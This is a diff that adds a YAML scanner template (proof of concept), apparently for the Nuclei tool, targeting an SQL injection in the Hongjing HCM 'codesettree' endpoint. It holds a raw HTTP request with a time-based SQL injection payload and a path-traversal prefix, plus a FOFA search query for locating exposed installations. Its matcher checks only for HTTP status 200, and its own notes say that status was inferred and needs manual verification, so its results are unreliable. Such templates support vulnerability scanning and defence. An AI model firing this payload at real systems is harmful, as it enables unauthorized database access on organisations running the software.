@@ -1,0 +1,31 @@
+id: poc-qr60q4956d5hc2gd
+info:
+  name: 宏景HCM-codesettree接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qr60q4956d5hc2gd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qr60q4956d5hc2gd
+    fofa: app="HJSOFT-HCM" || body="宏景" || body="/general/sys/hjaxmanage.js"
+http:
+- raw:
+  - 'GET /templates/attestation/../../servlet/codesettree?flag=3&codesetid=111'';waitfor+delay+''0:0:2''--+&parentid=-1&fromflag=" HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
